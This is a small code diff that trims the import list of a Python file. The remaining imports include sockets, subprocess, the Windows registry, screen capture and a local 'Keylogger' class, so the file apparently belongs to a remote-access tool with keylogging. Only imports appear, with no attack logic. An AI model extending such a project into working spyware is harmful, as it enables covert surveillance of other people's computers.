@@ -1,20 +1,12 @@
 import os
 import socket
 import subprocess
-import threading
-from io import BytesIO
-from PIL import Image, ImageTk
 import pygetwindow as gw
 import ctypes
 import tkinter as tk
-from tkinter import filedialog
-from tkinter import ttk
 import winreg
-import keyboard
 import sys
 import mss
-import pygetwindow
-import pyautogui
 import psutil
 from serverDesigner import ServerApp
 from keylog import Keylogger
